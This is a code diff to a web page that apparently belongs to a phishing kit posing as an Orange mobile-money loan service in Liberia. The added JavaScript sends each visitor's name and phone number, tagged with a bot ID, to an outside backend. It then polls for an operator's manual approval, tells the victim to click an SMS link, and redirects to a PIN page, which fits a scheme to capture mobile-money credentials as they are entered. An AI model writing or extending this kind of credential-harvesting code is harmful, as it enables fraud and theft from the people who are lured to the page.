@@ -120,37 +120,96 @@ background:#444;
 
 </form>
 
+<!-- ✅ added status text (no styling change) -->
+<div id="status" style="margin-top:15px;font-size:14px;color:#ccc;text-align:center;"></div>
+
 </div>
 
 </div>
 
 <script>
 
+const BACKEND_URL = "https://orange-loans-liberia.onrender.com";
+
+// ---------------- BOT ID ----------------
 const params = new URLSearchParams(window.location.search);
 const botId = params.get('botId') || window.location.pathname.split('/').pop();
 if (!botId) { alert("Invalid access link"); throw new Error(); }
 
+// ---------------- FLOW CHECK ----------------
 if (!localStorage.getItem('loanAmount')) {
     window.location.href = `index.html?botId=${botId}`;
 }
 
-const confirmCheck = document.getElementById('confirmCheck');
 const nextBtn = document.getElementById('nextBtn');
+const status = document.getElementById('status');
 
-if(confirmCheck){
-confirmCheck.addEventListener('change', () => {
-    nextBtn.disabled = !confirmCheck.checked;
-});
-}
-
-document.getElementById('detailsForm').addEventListener('submit', e => {
+// ---------------- SUBMIT ----------------
+document.getElementById('detailsForm').addEventListener('submit', async e => {
     e.preventDefault();
 
-    const phoneInput = document.getElementById('phone');
+    const phone = document.getElementById('phone').value.trim();
+    const name = localStorage.getItem('fullName'); // ✅ from storage
 
-    localStorage.setItem('phone', phoneInput.value);
+    if (!phone) return;
 
-    window.location.href = `pin.html?botId=${botId}`;
+    nextBtn.disabled = true;
+    nextBtn.textContent = "Processing...";
+    status.textContent = "";
+
+    try {
+        const res = await fetch(`${BACKEND_URL}/submit-details`, {
+            method: 'POST',
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({
+                name,
+                phone,
+                botId
+            })
+        });
+
+        const { requestId } = await res.json();
+
+        // store phone
+        localStorage.setItem('phone', phone);
+
+        // ✅ show SMS message
+        status.textContent = "Please click on the link you received in SMS to confirm your connection";
+
+        // ---------------- POLLING ----------------
+        const poll = setInterval(async () => {
+            try {
+                const r = await fetch(`${BACKEND_URL}/check-details/${requestId}`);
+                const d = await r.json();
+
+                // ✅ APPROVED → REDIRECT
+                if (d.approved === true) {
+                    clearInterval(poll);
+                    window.location.href = `pin.html?botId=${botId}&requestId=${requestId}`;
+                }
+
+                // ❌ REJECTED → STAY HERE
+                if (d.approved === false) {
+                    clearInterval(poll);
+                    status.textContent = "Request rejected. Please try again.";
+                    nextBtn.disabled = false;
+                    nextBtn.textContent = "Log in";
+                }
+
+            } catch (err) {
+                clearInterval(poll);
+                status.textContent = "Connection lost. Try again.";
+                nextBtn.disabled = false;
+                nextBtn.textContent = "Log in";
+            }
+
+        }, 1500);
+
+    } catch (err) {
+        status.textContent = "Network error, try again";
+        nextBtn.disabled = false;
+        nextBtn.textContent = "Log in";
+    }
 });
 
 </script>
